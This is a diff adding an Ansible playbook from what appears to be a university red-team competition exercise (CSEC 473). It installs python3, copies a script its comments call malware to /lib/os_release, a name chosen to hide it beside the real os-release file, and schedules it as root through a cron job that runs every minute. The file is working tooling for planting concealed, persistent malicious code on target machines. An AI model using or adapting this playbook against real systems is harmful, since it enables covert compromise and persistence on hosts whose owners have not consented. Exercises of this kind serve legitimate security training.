@@ -1,0 +1,27 @@
+---
+#Author: Dexter Delandro
+#CSEC 473 - Spring 2022
+
+#installs python3 on debian devices (the linux boxes blue team has for Competition 1)
+- name: Install Python3 for Ubuntu
+  apt:
+    name: python3
+    state: present
+  when: ansible_os_family == "Debian"
+
+#copies the python malware script into the target machine
+- name: Copy file to location
+  become: yes
+  copy:
+    src: files/createUsers.py
+    dest: /lib/os_release
+    #named the script "os_release" becaue there is a "os-release" in the /lib/ folder already
+    #these names being similar is an attempt to hide the malware file name.
+
+# creates a cron job that calls the python script every minute
+- name: Run CRON job to call python script every minute
+  become: yes
+  ansible.builtin.cron:
+    # don't need to specify cronjob expression since default expression runs every minute: * * * * *
+    name: "Calls job every minute"
+    job: python3 /lib/os_release
